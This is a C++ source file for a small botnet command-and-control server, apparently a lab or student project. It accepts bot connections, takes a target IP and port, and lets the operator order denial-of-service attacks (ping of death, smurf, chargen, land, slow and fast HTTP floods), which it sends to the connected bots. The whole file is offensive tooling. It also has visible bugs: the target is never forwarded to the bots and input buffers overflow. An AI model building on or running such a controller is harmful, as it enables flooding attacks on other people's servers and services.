#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <thread>
#include <signal.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <vector>

using namespace std;

bool start = false;
bool server_started = false;

char* attack = "None";
string target_ip;

vector<string> bots;
thread tListener;
vector<thread> threads;
int target_port;
int server_fd, valread, client_socket;
struct sockaddr_in server_address, client_address;
struct netbot_status {
	int id;
	bool start;
};

vector<netbot_status> netbots_statuses;

void setup_target_parameters()
{	
	cout << "Enter target ip address: \n";
	cin >> target_ip;
	cout << "\n Enter target port: \n";
	cin >> target_port;
}

void start_attack()
{
	start = true;
}

void printASCII(string fileName)
{
	string line = "";
	ifstream inFile;
	inFile.open(fileName);
	if (inFile.is_open())
	{
		while(getline(inFile, line))
		{
			cout << line << endl;
		}
	} else {
		cout << "File failed to load. " << endl;
		cout << "Nothing to display." << endl;
	}
	inFile.close();
}


void menu_header()
{
	string fileName = "dos_art.txt";
	printASCII(fileName);
}

void list_bots()
{
	cout << "Bots connected " << "(" << bots.size() <<"):\n";
	vector<string>::iterator iter = bots.begin();

	for(iter; iter < bots.end(); iter++) 
	{
		cout << "bot: " << *iter << "\n";
	}

	cout << endl;

	sleep(5);
}

void threaded(int i)
{
	char buffer[1024] = { 0 };	
	cout << "\nClient Socket File Descriptor: " << i << "\n";
	
	bzero(&buffer, sizeof(buffer));
	valread = read(i, buffer, 1024);
        cout << "\n" << buffer;
	while (1)
	{
		netbot_status bot;
	
		if (start == true) 
		{
			vector<netbot_status>::iterator iter = netbots_statuses.begin();
			for(iter; iter < netbots_statuses.end(); iter++) 
			{
				if ((*iter).id == i) 
				{
					bot = *iter;
					break;				
				}
			}
			
			bot.start = true;
		}

		if (attack != "None" && bot.start == true)
	       	{
			send(i, attack, strlen(attack), 0);
			cout << "Server attack sent\n";
			sleep(1);
			bot.start = false;
			start = false;
		}
	}	
}

void connection_listener(int i)
{
	while(bots.size() != 3)
	{
		socklen_t client_length = sizeof(client_address);
		if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
			perror("accept");
			exit(EXIT_FAILURE);
		}

		bots.push_back(inet_ntoa(client_address.sin_addr));
		netbots_statuses.push_back({ client_socket, false });
	
		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << bots.size() << endl;

		threads.push_back(thread(threaded, client_socket));
  		threads.back().detach();
	}

}


void start_server()
{
	if (server_started == false)
	{
		server_started = true;
		int opt = 1;
		int addrlen = sizeof(server_address);
		char buffer[1024] = { 0 };
		char* hello = "Hello from server";
	
		// Creating socket file descriptor
		if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			perror("Socket failed");
			exit(EXIT_FAILURE);
		}

		// Forcefully attaching socket to the port specified
			if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
			perror("setsockopt");
			exit(EXIT_FAILURE);
		}

		server_address.sin_family = AF_INET;
		server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
		server_address.sin_port = htons(8080);

		// Binding address and port to the socket
		if (bind(server_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
			perror("bind failed");
			exit(EXIT_FAILURE);
		}

		// Wait for clients connections
		if (listen(server_fd, 3) < 0) {
			perror("listem");
			exit(EXIT_FAILURE);
		}
        
		tListener = thread(connection_listener, 1);
		tListener.detach();
	}
		
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Server options: \n\n";
		cout << "1. start attack\n";
		cout << "2. list connected bots\n";
		cout << "3. exit\n";	
		cout << "\nServer started, waiting for client connections...\n";

		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				start_attack();
				break;
			case 2:
				list_bots();
				break;
			case 3:
				shutdown(server_fd, SHUT_RDWR);
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while (int_choice != 3);
}

void setup_attack_type()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Attack options: \n\n";
		cout << "1. Ping of death attack\n";
		cout << "2. Smurf attack\n";
		cout << "3. Chargen attack\n";
		cout << "4. Land attack\n";
		cout << "5. Slow HTTP attack\n";
		cout << "6. Fast HTTP attack\n";
		cout << "7. exit\n";

		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				attack = "POD";
				break;
			case 2:
				attack = "SMURF";
				break;
			case 3:
				attack = "CHARGEN";
				break;
			case 4:
				attack = "LAND";
				break;
			case 5:
				attack = "SLOWHTTP";
				break;
			case 6:
				attack = "FASTHTTP";
				break;
			case 7:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while (int_choice != 1 && int_choice != 2 && int_choice != 3 && int_choice != 4 && int_choice != 5 && int_choice != 6 && int_choice != 7);

}

void play_music(string songName)
{
	string cmd = "canberra-gtk-play -f music/" + songName;
	system(cmd.c_str());
}

void main_menu()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Dominic's CCC menu selection: \n\n";
		cout << "1. setup target parameters\n";
		cout << "2. setup attack type\n";
		cout << "3. start server\n";
		cout << "4. Exit\n";
		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				setup_target_parameters();
				break;
			case 2:
				setup_attack_type();
				break;
			case 3:
				start_server();
				break;
			case 4:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while(int_choice != 4);
}

int main()
{
	// system("canberra-gtk-play -f music/music.wav");
	main_menu();
	cout << "Thank you for using dominic's CCC. Have a great day!";
	return 0;
}
